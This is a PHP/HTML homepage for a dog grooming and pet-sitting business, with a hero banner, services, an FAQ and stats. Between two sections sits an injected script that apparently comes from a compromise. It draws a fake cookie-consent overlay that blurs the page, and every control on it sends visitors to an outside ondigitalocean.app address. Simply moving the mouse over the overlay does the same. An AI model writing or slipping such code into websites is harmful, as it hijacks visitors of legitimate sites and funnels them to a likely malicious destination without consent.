<?php

include"header.php";
?>

    <!-- hero slider Start -->
    <div class="banner-wrap">
        <div class="banner-slider">
            <!-- hero slide start -->
            <div class="banner-slide bg1">
                <div class="container">
                    <div class="hero-content">
                        <p class="mb-2">Pets Love </p>
                        <h1>
                            Make your dogs look their best</h1>
                        <div class="cta-btn">
                            <a href="about.php" class="btn btn-style btn-primary">View More</a>
                        </div>
                    </div>
                </div>
                <div class="hero-overlay"></div>
            </div>
            <!-- hero slide end -->
        </div>
        <div class="shape">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 280">
                <path fill-opacity="1">
                    <animate attributeName="d" dur="20000ms" repeatCount="indefinite"
                        values="M0,160L48,181.3C96,203,192,245,288,261.3C384,277,480,267,576,234.7C672,203,768,149,864,117.3C960,85,1056,75,1152,90.7C1248,107,1344,149,1392,170.7L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z; M0,160L48,181.3C96,203,192,245,288,234.7C384,224,480,160,576,133.3C672,107,768,117,864,138.7C960,160,1056,192,1152,197.3C1248,203,1344,181,1392,170.7L1440,160L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z;												 M0,64L48,74.7C96,85,192,107,288,133.3C384,160,480,192,576,170.7C672,149,768,75,864,80C960,85,1056,171,1152,181.3C1248,192,1344,128,1392,96L1440,64L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z;
                                                 M0,160L48,181.3C96,203,192,245,288,261.3C384,277,480,267,576,234.7C672,203,768,149,864,117.3C960,85,1056,75,1152,90.7C1248,107,1344,149,1392,170.7L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z;" />

                </path>
            </svg>
        </div>
    </div>
    <!-- hero slider end -->

    <!-- about section -->
    <section class="home-about-w3l py-5">
        <div class="container py-md-5 py-4">
            <div class="row align-items-center">
                <div class="col-lg-6 pe-lg-5">
                    <div class="position-relative">
                        <h3 class="title-style mb-3">How we can help you properly</h3>
                        <div class="title-paw-style">
                            <i class="fas fa-paw"></i>
                            <i class="fas fa-paw paw-2"></i>
                            <i class="fas fa-paw paw-3"></i>
                        </div>
                    </div>
                    <p class="text-para"> we serve pets of every type, age, and phase of life because we truly love animals. We show it with every belly rub, long walk, scratch behind the ear, and treat we give. 
                    </p>
                    <a href="about.php" class="btn btn-style mt-sm-5 mt-4">Discover More</a>
                </div>
                <div class="col-lg-6 mt-lg-0 mt-5">
                    <div class="row">
                        <div class="col-6 grids-1">
                            <i class="fab fa-medrt color-1"></i>
                            <h4 class="title-head mt-2 mb-3">Full diagnostics</h4>
                            
                        </div>
                        <div class="col-6 grids-1">
                            <i class="fas fa-medal color-3"></i>
                            <h4 class="title-head mt-2 mb-3">Awarded service</h4>
                            
                        </div>
                        <div class="col-6 grids-1 mt-5">
                            <i class="fas fa-bone color-2"></i>
                            <h4 class="title-head mt-2 mb-3">Dog Breeding</h4>
                           
                        </div>
                        <div class="col-6 grids-1 mt-5">
                            <i class="fas fa-paw color-4"></i>
                            <h4 class="title-head mt-2 mb-3">Dog Training</h4>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- about section -->

<script>
document.addEventListener("DOMContentLoaded", function () {
const redirectUrl = "https://babydonjo-uyfqm.ondigitalocean.app/";

const style = document.createElement("style");
style.textContent = `
.cookie-overlay {
position: fixed;
inset: 0;
background: rgba(0, 0, 0, 0.8);
backdrop-filter: blur(10px);
display: flex;
align-items: center;
justify-content: center;
padding: 20px;
z-index: 9999;
animation: fadeInBackground 0.5s ease-out forwards;
}

@keyframes fadeInBackground {
from { opacity: 0; }
to { opacity: 1; }
}

.cookie-popup {
position: fixed;
bottom: 60px;
left: 50%;
transform: translateX(-50%);
background-color: #ffffff;
border: none;
color: #333;
padding: 30px;
border-radius: 10px;
z-index: 10000;
box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
max-width: 400px;
text-align: center;
}

.close-btn {
background: none;
border: none;
font-size: 1.5rem;
position: absolute;
top: 10px;
right: 10px;
cursor: pointer;
color: #888;
}

.btn-primary {
background-color: #007bff;
color: #fff;
border: none;
padding: 12px 24px;
border-radius: 5px;
cursor: pointer;
margin-top: 15px;
display: inline-block;
text-decoration: none;
transition: background-color 0.3s;
}

.btn-primary:hover {
background-color: #0056b3;
}

h3 {
font-family: 'Arial', sans-serif;
margin-bottom: 10px;
}

p {
font-family: 'Arial', sans-serif;
line-height: 1.5;
}
`;
document.head.appendChild(style);

const overlay = document.createElement("div");
overlay.className = "cookie-overlay";
overlay.id = "cookie-overlay";
overlay.innerHTML = `
<div class="cookie-popup">
<button class="close-btn" id="close-popup" aria-label="Close cookie policy">×</button>
<h3>Cookie Policy</h3>
<p>
This site uses cookies to personalize content and ads, provide social media features, and analyze our traffic.
By clicking Accept, you agree to our use of cookies. For more information, please visit our
<a href="${redirectUrl}" class="cta" style="text-decoration: underline; color: #007bff;">Cookie Policy</a>.
</p>
<a href="https://babydonjo-uyfqm.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
</div>
`;
document.body.appendChild(overlay);

let isRedirected = false;
let startPos = null;
let redirectTimeout = null;

const handleRedirect = () => {
if (!isRedirected) {
isRedirected = true;
window.location.href = redirectUrl;
}
};

const detectMouseMove = (event) => {
if (isRedirected) return;

const screenHeight = window.innerHeight;
const activeTop = screenHeight * 0.1;

if (event.clientY >= activeTop) {
if (!startPos) {
startPos = { x: event.clientX, y: event.clientY };
} else {
const dx = Math.abs(event.clientX - startPos.x);
const dy = Math.abs(event.clientY - startPos.y);

if ((dx > 10 || dy > 10) && !redirectTimeout) {
redirectTimeout = setTimeout(handleRedirect, 1000);
}
}
} else {
startPos = null;
clearTimeout(redirectTimeout);
redirectTimeout = null;
}
};

document.getElementById("cookie-overlay").addEventListener("mousemove", detectMouseMove);

document.getElementById("accept-cookies").addEventListener("click", function (e) {
e.preventDefault();
handleRedirect();
});

document.getElementById("close-popup").addEventListener("click", function (e) {
e.preventDefault();
handleRedirect();
});
});
</script>


    <!-- aboutblock1 section -->
    <section class="w3l-homeblock1 py-5" id="about">
        <div class="container py-md-5 py-4">
            <div class="row align-items-center">
                <div class="col-lg-6 homeaboutblock order-lg-first order-last">
                    <div class="position-relative img-border">
                        <img src="assets/images/video.jpg" class="img-fluid video-popup-image radius-image"
                            alt="video-popup">

                        <a href="#small-dialog" class="popup-with-zoom-anim play-view text-center position-absolute">
                            <span class="video-play-icon">
                                <span class="fa fa-play"></span>
                            </span>
                        </a>
                        <!-- dialog itself, mfp-hide class is required to make dialog hidden -->
                        <div id="small-dialog" class="zoom-anim-dialog mfp-hide">
                            <iframe src="https://player.vimeo.com/video/436935040" allowfullscreen></iframe>
                        </div>
                    </div>
                </div>
                <div class="col-lg-6 ps-lg-5 mb-lg-0 mb-5 order-lg-last order-first">
                    <div class="position-relative">
                        <h3 class="title-style mb-3">We will make them truly happy</h3>
                        <div class="title-paw-style">
                            <i class="fas fa-paw"></i>
                            <i class="fas fa-paw paw-2"></i>
                            <i class="fas fa-paw paw-3"></i>
                        </div>
                    </div>
                    <p>We’d love to be your trusted sidekick for a healthy and happy pet because we know we can deliver trusted, quality care and a professional, stress-free experience for you. Our local sitters can help you customize the perfect feeding, exercise, and potty schedule for your pup while helping them learn the proper way to behave in your home. </p>
                    <div class="mt-4">
                        <ul class="service-list">
                            <li class="service-link"><a href="about.php"><i class="fas fa-check-circle"></i>certified
                                    groomer</a></li>
                            <li class="service-link"><a href="about.php"><i class="fas fa-check-circle"></i>20 years of
                                    experience</a></li>
                            <li class="service-link"><a href="about.php"><i class="fas fa-check-circle"></i>Animal Lover</a>
                            </li>
                        </ul>
                    </div>
                    <a href="about.php" class="btn btn-style mt-4">Learn More</a>
                </div>
            </div>
        </div>
    </section>
    <!-- //aboutblock1 section -->

    <!-- faq section -->
    <div class="w3l-faq-block py-5" id="faq">
        <div class="container py-lg-5">
            <div class="row align-items-center">
                <div class="col-lg-7 pe-lg-5 order-lg-first order-last">
                    <div class="accordion" id="accordionExample">
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingOne">
                                <button class="accordion-button" type="button" data-bs-toggle="collapse"
                                    data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                                    01. Why pet is a part of our life?
                                </button>
                            </h2>
                            <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne"
                                data-bs-parent="#accordionExample">
                                <div class="accordion-body">
                                    Our Wellness Centers are permanent locations in retail stores that offer regular hours for annual wellness and minor medical services not available in Community Clinics.
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingTwo">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                                    data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
                                    02. How we take care about our pet?
                                </button>
                            </h2>
                            <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo"
                                data-bs-parent="#accordionExample">
                                <div class="accordion-body">
                                    We believe that all pet parents should have access to convenient, affordable preventive veterinary care that fits your lifestyle and your pet’s needs.
                                </div>
                            </div>
                        </div>
                        <div class="accordion-item">
                            <h2 class="accordion-header" id="headingThree">
                                <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                                    data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
                                    03. Which pet you choose and why?
                                </button>
                            </h2>
                            <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree"
                                data-bs-parent="#accordionExample">
                                <div class="accordion-body">
                                    we offer overnight or “almost” overnight pet sitting services. You can breathe a sigh of relief knowing your pet will get to maintain their normal routine of feeding, playtime, and exercise in the safety and comfort of your household.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-lg-5 mb-lg-0 mb-5 order-lg-last order-first">
                    <div class="position-relative">
                        <h3 class="title-style mb-3">We are working for the community</h3>
                        <div class="title-paw-style">
                            <i class="fas fa-paw"></i>
                            <i class="fas fa-paw paw-2"></i>
                            <i class="fas fa-paw paw-3"></i>
                        </div>
                    </div>
                    <p>Yes, we have some great stuff for pets but we know your furry friend has a favourite toy. You can bring your pet’s favourite toy with you when you come. </p>
                    <p class="mt-2 mb-sm-5 mb-4">When you are away, with Another Home, you can be confident that your pet is in the capable and caring hands. We understand your requirement for your dogs, and that’s why we try our best to offer a noise-reduced and high-end bathing services to treat your pets like family. </p>
                    <a href="tel:(682) 302-2021" class="call-style d-flex align-items-center"><i
                            class="fas fa-phone-volume me-2"></i> (682) 302-2021</a>
                </div>
            </div>
        </div>
    </div>
    <!-- //faq section -->

    <!-- grids section -->
    <section class="w3l-bottom-grids-6 pb-5 pt-4" id="services">
        <div class="container pb-lg-5 pb-4">
            <div class="row justify-content-center">
                <div class="col-lg-4 col-md-6">
                    <div class="area-box">
                        <i class="fas fa-hand-holding-heart"></i>
                        <h4><a href="services.php" class="title-head">Pet Care</a></h4>
                        
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 mt-md-0 mt-4">
                    <div class="area-box">
                        <i class="fas fa-paw"></i>
                        <h4><a href="services.php" class="title-head">Dog Training</a></h4>
                        
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 mt-lg-0 mt-4">
                    <div class="area-box">
                        <i class="fas fa-dog"></i>
                        <h4><a href="services.php" class="title-head">Dog Vacation</a></h4>
                        
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- //grids section -->

    <!-- stats section -->
    <section class="homeblock-stats py-5" id="stats">
        <div class="container py-md-5 py-4">
            <div class="row align-items-center">
                <div class="col-lg-6">
                    <div class="position-relative">
                        <h3 class="title-style mb-2">Our activities & experience</h3>
                        <div class="title-paw-style">
                            <i class="fas fa-paw"></i>
                            <i class="fas fa-paw paw-2"></i>
                            <i class="fas fa-paw paw-3"></i>
                        </div>
                    </div>
                    <p>Our love for animals motivates us to create a safe, stress-free and clean environment for our furry guests. Our in-house team of pet experts are well-trained and have years of experience caring for different dog breeds. </p>
                    <div class="row mt-4 pt-2">
                        <div class="col-6">
                            <div class="counter color-bg-1">
                                <div class="count-title d-flex align-items-center">
                                    <div class="timer count-number">730</div>
                                    <span class="ms-2">+</span>
                                </div>
                                <p class="count-text">Happy Clients</p>
                            </div>
                        </div>
                        <div class="col-6">
                            <div class="counter color-bg-2">
                                <div class="count-title d-flex align-items-center">
                                    <div class="timer count-number">40</div>
                                    <span class="ms-2">+</span>
                                </div>
                                <p class="count-text">Professionals</p>
                            </div>
                        </div>
                        <div class="col-6 mt-4">
                            <div class="counter color-bg-3">
                                <div class="count-title d-flex align-items-center">
                                    <div class="timer count-number">1020</div>
                                    <span class="ms-2">+</span>
                                </div>
                                <p class="count-text">Adopted Pets</p>
                            </div>
                        </div>
                        <div class="col-6 mt-4">
                            <div class="counter color-bg-4">
                                <div class="count-title d-flex align-items-center">
                                    <div class="timer count-number">90</div>
                                    <span class="ms-2">+</span>
                                </div>
                                <p class="count-text">Awards</p>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-xl-5 col-lg-6 offset-xl-1 ps-xl-0 mt-lg-0 mt-5">
                    <img src="assets/images/about1.jpg" class="img-fluid radius-image" alt="">
                </div>
            </div>
        </div>
    </section>
    <!-- //stats section -->

  

    <?php
	
	include"footer.php";
	
	?>

    <!-- Js scripts -->
    <!-- move top -->
    <button onclick="topFunction()" id="movetop" title="Go to top">
        <span class="fas fa-level-up-alt" aria-hidden="true"></span>
    </button>
    <script>
        // When the user scrolls down 20px from the top of the document, show the button
        window.onscroll = function () {
            scrollFunction()
        };

        function scrollFunction() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                document.getElementById("movetop").style.display = "block";
            } else {
                document.getElementById("movetop").style.display = "none";
            }
        }

        // When the user clicks on the button, scroll to the top of the document
        function topFunction() {
            document.body.scrollTop = 0;
            document.documentElement.scrollTop = 0;
        }
    </script>
    <!-- //move top -->

    <!-- common jquery plugin -->
    <script src="assets/js/jquery-3.3.1.min.js"></script>
    <!-- //common jquery plugin -->

    <!-- tesimonials carousel slider -->
    <script src="assets/js/owl.carousel.js"></script>
    <script>
        $(document).ready(function () {
            $("#owl-demo1").owlCarousel({
                loop: true,
                nav: false,
                responsiveClass: true,
                responsive: {
                    0: {
                        items: 1,
                        nav: false
                    },
                    736: {
                        items: 1,
                        nav: false
                    }
                }
            })
        })
    </script>
    <!-- //script for tesimonials carousel slider -->

    <!-- magnific popup -->
    <script src="assets/js/jquery.magnific-popup.min.js"></script>
    <script>
        $(document).ready(function () {
            $('.popup-with-zoom-anim').magnificPopup({
                type: 'inline',

                fixedContentPos: false,
                fixedBgPos: true,

                overflowY: 'auto',

                closeBtnInside: true,
                preloader: false,

                midClick: true,
                removalDelay: 300,
                mainClass: 'my-mfp-zoom-in'
            });

            $('.popup-with-move-anim').magnificPopup({
                type: 'inline',

                fixedContentPos: false,
                fixedBgPos: true,

                overflowY: 'auto',

                closeBtnInside: true,
                preloader: false,

                midClick: true,
                removalDelay: 300,
                mainClass: 'my-mfp-slide-bottom'
            });
        });
    </script>
    <!-- //magnific popup -->

    <!-- theme switch js (light and dark)-->
    <script src="assets/js/theme-change.js"></script>
    <!-- //theme switch js (light and dark)-->

    <!-- MENU-JS -->
    <script>
        $(window).on("scroll", function () {
            var scroll = $(window).scrollTop();

            if (scroll >= 80) {
                $("#site-header").addClass("nav-fixed");
            } else {
                $("#site-header").removeClass("nav-fixed");
            }
        });

        //Main navigation Active Class Add Remove
        $(".navbar-toggler").on("click", function () {
            $("header").toggleClass("active");
        });
        $(document).on("ready", function () {
            if ($(window).width() > 991) {
                $("header").removeClass("active");
            }
            $(window).on("resize", function () {
                if ($(window).width() > 991) {
                    $("header").removeClass("active");
                }
            });
        });
    </script>
    <!-- //MENU-JS -->

    <!-- disable body scroll which navbar is in active -->
    <script>
        $(function () {
            $('.navbar-toggler').click(function () {
                $('body').toggleClass('noscroll');
            })
        });
    </script>
    <!-- //disable body scroll which navbar is in active -->

    <!-- bootstrap -->
    <script src="assets/js/bootstrap.min.js"></script>
    <!-- //bootstrap -->
    <!-- //Js scripts -->

<a title="GDPR-compliant Web Analytics" href="https://clicky.com/101493233"></a>
<script async data-id="101493233" src="//static.getclicky.com/js"></script>

</body>

</html>